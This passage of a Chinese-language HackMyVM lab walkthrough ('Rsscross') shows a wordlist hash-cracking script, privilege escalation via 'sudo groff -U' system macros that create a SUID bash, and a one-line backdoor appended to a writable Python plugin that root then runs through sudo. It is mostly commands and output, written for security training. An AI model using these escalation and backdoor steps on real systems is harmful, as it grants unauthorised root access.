class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[+] 密码明文 : &#123;word&#125;&quot;</span>)<br>                <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[!] 提示: 在输入密码时，千万别把换行输进去，就输 [&#123;word&#125;]&quot;</span>)<br>                sys.exit(0)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 字典跑完了，没有找到匹配的密码。&quot;</span>)<br><br>except FileNotFoundError:<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;\n[-] 错误: 找不到字典文件 &#123;wordlist&#125;，请确认它在当前目录下。&quot;</span>)<br>except KeyboardInterrupt:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 用户提前终止了爆破。&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# python3 exp.py<br>[*] 开始执行爆破...<br>[*] 目标 <span class="hljs-symbol">Hash</span> : <span class="hljs-number">07e2</span>a8ac8bd28bc3a0ffc4fab3145b5b<br>[*] 字典文件  : rockyou.txt<br>----------------------------------------<br><br>[+] 🎉 爆破成功 (带换行 / 默认 echo)!<br>[+] 密码明文 : zombie666<br>[!] 提示: 在输入密码时，千万别把换行输进去，就输 [zombie666]<br></code></pre></td></tr></table></figure>
+
+<p>也是成功爆破出了密码。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zb<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/app</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> zb on <span class="hljs-symbol">RssCross:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> zb may run the following commands on <span class="hljs-symbol">RssCross:</span><br>    (mob) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/groff<br>zb<span class="hljs-variable">@RssCross</span><span class="hljs-symbol">:/app</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>之前到处扒拉的时候四处查找，看zb组所属的文件，发现了这个东西。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal">zb<span class="hljs-variable">@RssCross</span>:<span class="hljs-regexp">/app$ find /</span> -group zb -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span><br><span class="hljs-regexp">/run/user</span><span class="hljs-regexp">/1000/systemd</span><span class="hljs-regexp">/inaccessible/reg</span><br><span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/lib/python</span>3.<span class="hljs-number">9</span>/dist-packages/smassh/src/plugins/add_language.py<br><span class="hljs-regexp">/home/zb</span><span class="hljs-regexp">/.bash_logout</span><br><span class="hljs-regexp">/home</span><span class="hljs-regexp">/zb/</span>.bashrc<br><span class="hljs-regexp">/home/zb</span><span class="hljs-regexp">/.profile</span><br><span class="hljs-regexp">/home</span><span class="hljs-regexp">/zb/</span>.viminfo<br></code></pre></td></tr></table></figure>
+
+<p>目前有两条线索，一个是可以以mob的身份执行groff，一个是zb也就是我们可以修改这个python文件。</p>
+<p>先遵循第一条线索，groff是个Linux 系统自带的一个非常古老的文本排版和格式化工具。</p>
+<p>groff -U（不安全模式）允许执行内置的 <code>.sy</code> 系统调用宏，我们可以利用它复制 bash 并赋予 SUID 权限。</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tap">zb@RssCross:/app$ cat &lt;&lt;EOF &gt; /tmp/exploit.roff<br>&gt; .sy cp /bin/bash /tmp/mob_bash<br>&gt; .sy chmod +s /tmp/mob_bash<br>&gt; EOF<br>zb@RssCross:/app$ cd /tmp<br>zb@RssCross:/tmp$ ls<br>exploit.roff                                                             systemd-private-0d74693ffc5647db8b20cae9f50bab04-systemd-logind.service-rmWnqf<br>systemd-private-0d74693ffc5647db8b20cae9f50bab04-apache2.service-T2Ndui  systemd-private-0d74693ffc5647db8b20cae9f50bab04-systemd-timesyncd.service-lPYBBg<br>zb@RssCross:/tmp$ sudo -u mob /usr/bin/groff -U /tmp/exploit.roff<br>zb@RssCross:/tmp$ ls -al<br>total 1188<br>drwxrwxrwt<span class="hljs-number"> 10 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:25 .<br>drwxr-xr-x<span class="hljs-number"> 19 </span>root root   <span class="hljs-number"> 4096 </span>Dec <span class="hljs-number"> 3 </span>10:59 ..<br>-rw-r--r-- <span class="hljs-number"> 1 </span>zb   zb       <span class="hljs-number"> 58 </span>Mar<span class="hljs-number"> 27 </span>06:25 exploit.roff<br>drwxrwxrwt <span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 .font-unix<br>drwxrwxrwt <span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 .ICE-unix<br>-rwsr-sr-x <span class="hljs-number"> 1 </span>mob  mob <span class="hljs-number"> 1168776 </span>Mar<span class="hljs-number"> 27 </span>06:25 mob_bash<br>drwx------ <span class="hljs-number"> 3 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 systemd-private-0d74693ffc5647db8b20cae9f50bab04-apache2.service-T2Ndui<br>drwx------ <span class="hljs-number"> 3 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 systemd-private-0d74693ffc5647db8b20cae9f50bab04-systemd-logind.service-rmWnqf<br>drwx------ <span class="hljs-number"> 3 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 systemd-private-0d74693ffc5647db8b20cae9f50bab04-systemd-timesyncd.service-lPYBBg<br>drwxrwxrwt <span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 .Test-unix<br>drwxrwxrwt <span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 .X11-unix<br>drwxrwxrwt <span class="hljs-number"> 2 </span>root root   <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 27 </span>06:11 .XIM-unix<br>zb@RssCross:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>我们可以这样来获得权限</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">zb</span>@RssCross:/tmp$ ./mob_bash -p<br><span class="hljs-attribute">mob_bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span>$ id<br><span class="hljs-attribute">uid</span>=<span class="hljs-number">1000</span>(zb) gid=<span class="hljs-number">1000</span>(zb) euid=<span class="hljs-number">1001</span>(mob) egid=<span class="hljs-number">1001</span>(mob) groups=<span class="hljs-number">1001</span>(mob),<span class="hljs-number">1000</span>(zb)<br><span class="hljs-attribute">mob_bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span>$ <br></code></pre></td></tr></table></figure>
+
+<p>写公钥进去稳定权限</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs perl">┌──(root㉿kaada)-[~<span class="hljs-regexp">/.ssh]</span><br><span class="hljs-regexp">└─# ssh mob@192.168.56.53</span><br><span class="hljs-regexp">The authenticity of host &#x27;192.168.56.53 (192.168.56.53)&#x27; can&#x27;t be established.</span><br><span class="hljs-regexp">ED25519 key fingerprint is: SHA256:O2iH79i8PgOwV/</span>Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ<br>This host key is known by the following other names/addresses:<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">9</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">10</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">15</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">16</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">17</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">18</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">20</span>: [hashed name]<br>    ~<span class="hljs-regexp">/.ssh/</span>known_hosts:<span class="hljs-number">27</span>: [hashed name]<br>    (<span class="hljs-number">31</span> additional names omitted)<br>Are you sure you want to <span class="hljs-keyword">continue</span> connecting (yes/<span class="hljs-keyword">no</span>/[fingerprint])? yes<br>Warning: Permanently added <span class="hljs-string">&#x27;192.168.56.53&#x27;</span> (ED25519) to the list of known hosts.<br>** WARNING: connection is <span class="hljs-keyword">not</span> using a post-quantum key exchange algorithm.<br>** This session may be vulnerable to <span class="hljs-string">&quot;store now, decrypt later&quot;</span> attacks.<br>** The server may need to be upgraded. See https:<span class="hljs-regexp">//</span>openssh.com/pq.html<br>Linux RssCross <span class="hljs-number">4.19</span>.<span class="hljs-number">0</span>-<span class="hljs-number">27</span>-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described in the<br>individual files in /usr/share/doc/*<span class="hljs-regexp">/copyright.</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">Debian GNU/</span>Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>mob<span class="hljs-variable">@RssCross</span>:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mob on RssCross:<br>    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/l</span>ocal/sbin\:<span class="hljs-regexp">/usr/l</span>ocal/bin\:<span class="hljs-regexp">/usr/s</span>bin\:<span class="hljs-regexp">/usr/</span>bin\:<span class="hljs-regexp">/sbin\:/</span>bin<br><br>User mob may run the following commands on RssCross:<br>    (ALL) NOPASSWD: <span class="hljs-regexp">/usr/l</span>ocal/bin/smassh<br><br></code></pre></td></tr></table></figure>
+
+<p>这里就柳暗花明了，zb用户可以朝插件写入后门，先提前写好后门，而我们要做的就是以mob用户的身份去执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mob_bash-<span class="hljs-number">5.0</span>$ echo <span class="hljs-string">&#x27;import os; os.system(&quot;chmod u+s /bin/bash&quot;)&#x27;</span> &gt;&gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">9</span><span class="hljs-regexp">/dist-packages/</span>smassh<span class="hljs-regexp">/src/</span>plugins/add_language.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs vim">mob@RssCross:~$ smassh --<span class="hljs-keyword">help</span><br>Usage: smassh [OPTIONS] COMMAND [ARGS]...<br><br>Options:<br>  -v, --<span class="hljs-keyword">version</span>  Show <span class="hljs-keyword">version</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.<br>  -h, --<span class="hljs-keyword">help</span>     Show this message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.<br><br>Commands:<br>  <span class="hljs-built_in">add</span>  Add <span class="hljs-keyword">a</span> <span class="hljs-keyword">language</span> <span class="hljs-keyword">to</span> smassh<br>mob@RssCross:~$ sudo /usr/local/bin/smassh <span class="hljs-built_in">add</span> hacker<br>=&gt; Checking <span class="hljs-keyword">if</span> <span class="hljs-keyword">language</span> pack <span class="hljs-built_in">exists</span>...<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connection.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">198</span>, in _new_conn<br>    sock = connection.create_connection(<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/util/connection.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">60</span>, in create_connection<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">res</span> in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):<br>  File <span class="hljs-string">&quot;/usr/lib/python3.9/socket.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">953</span>, in getaddrinfo<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">res</span> in _socket.getaddrinfo(host, port, family, <span class="hljs-built_in">type</span>, proto, flags):<br>socket.gaierror: [Errno -<span class="hljs-number">3</span>] Temporary failure in name resolution<br><br>The above exception was the direct cause of the following exception:<br><br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">787</span>, in urlopen<br>    response = self._make_request(<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">488</span>, in _make_request<br>    raise new_e<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">464</span>, in _make_request<br>    self._validate_conn(conn)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1093</span>, in _validate_conn<br>    conn.connect()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connection.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">753</span>, in connect<br>    self.sock = sock = self._new_conn()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connection.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">205</span>, in _new_conn<br>    raise NameResolutionError(self.host, self, <span class="hljs-keyword">e</span>) from <span class="hljs-keyword">e</span><br>urllib3.exceptions.NameResolutionError: &lt;urllib3.connection.HTTPSConnection object at <span class="hljs-number">0</span>x7f0e7dafe790&gt;: Failed <span class="hljs-keyword">to</span> <span class="hljs-built_in">resolve</span> <span class="hljs-string">&#x27;raw.githubusercontent.com&#x27;</span> ([Errno -<span class="hljs-number">3</span>] Temporary failure in name resolution)<br><br>The above exception was the direct cause of the following exception:<br><br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/adapters.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">644</span>, in send<br>    resp = conn.urlopen(<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">841</span>, in urlopen<br>    retries = retries.increment(<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/urllib3/util/retry.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">519</span>, in increment<br>    raise MaxRetryError(_pool, url, reason) from reason  # <span class="hljs-built_in">type</span>: ignore[arg-<span class="hljs-built_in">type</span>]<br>urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;raw.githubusercontent.com&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded with url: /monkeytypegame/monkeytype/master/frontend/static/languages/hacker.json (Caused by NameResolutionError(<span class="hljs-string">&quot;&lt;urllib3.connection.HTTPSConnection object at 0x7f0e7dafe790&gt;: Failed to resolve &#x27;raw.githubusercontent.com&#x27; ([Errno -3] Temporary failure in name resolution)&quot;</span>))<br><br>During handling of the above exception, another exception occurred:<br><br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/bin/smassh&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">8</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br>    sys.<span class="hljs-keyword">exit</span>(main())<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/click/core.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1161</span>, in __call__<br>    <span class="hljs-keyword">return</span> self.main(*<span class="hljs-keyword">args</span>, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/click/core.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1082</span>, in main<br>    <span class="hljs-keyword">rv</span> = self.invoke(ctx)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/click/core.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1697</span>, in invoke<br>    <span class="hljs-keyword">return</span> _process_result(sub_ctx.<span class="hljs-keyword">command</span>.invoke(sub_ctx))<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/click/core.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1443</span>, in invoke<br>    <span class="hljs-keyword">return</span> ctx.invoke(self.callback, **ctx.params)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/click/core.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">788</span>, in invoke<br>    <span class="hljs-keyword">return</span> __callback(*<span class="hljs-keyword">args</span>, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/smassh/__main__.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">32</span>, in <span class="hljs-built_in">add</span><br>    AddLanguage().<span class="hljs-built_in">add</span>(name)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/smassh/src/plugins/add_language.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">38</span>, in <span class="hljs-built_in">add</span><br>    pack = self.get_pack(name)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/smassh/src/plugins/add_language.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">26</span>, in get_pack<br>    req = requests.<span class="hljs-built_in">get</span>(uri)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/api.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">73</span>, in <span class="hljs-built_in">get</span><br>    <span class="hljs-keyword">return</span> request(<span class="hljs-string">&quot;get&quot;</span>, url, params=params, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/api.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">59</span>, in request<br>    <span class="hljs-keyword">return</span> session.request(method=method, url=url, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/sessions.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">589</span>, in request<br>    resp = self.send(prep, **send_kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/sessions.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">703</span>, in send<br>    r = adapter.send(request, **kwargs)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/requests/adapters.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">677</span>, in send<br>    raise ConnectionError(<span class="hljs-keyword">e</span>, request=request)<br>requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;raw.githubusercontent.com&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded with url: /monkeytypegame/monkeytype/master/frontend/static/languages/hacker.json (Caused by NameResolutionError(<span class="hljs-string">&quot;&lt;urllib3.connection.HTTPSConnection object at 0x7f0e7dafe790&gt;: Failed to resolve &#x27;raw.githubusercontent.com&#x27; ([Errno -3] Temporary failure in name resolution)&quot;</span>))<br>mob@RssCross:~$ <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> /bin/bash<br>-rwsr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">1</span> root root <span class="hljs-number">1168776</span> Apr <span class="hljs-number">18</span>  <span class="hljs-number">2019</span> /bin/bash<br>mob@RssCross:~$ <br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HVM/" class="print-no-link">#HVM</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackMyVM-Rsscross</div>
+      <div>http://example.com/2026/03/27/HackMyVM-Rsscross/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 27, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/15/HackTheBox-Pirate/" title="HackTheBox-Pirate">
+                        <span class="hidden-mobile">HackTheBox-Pirate</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
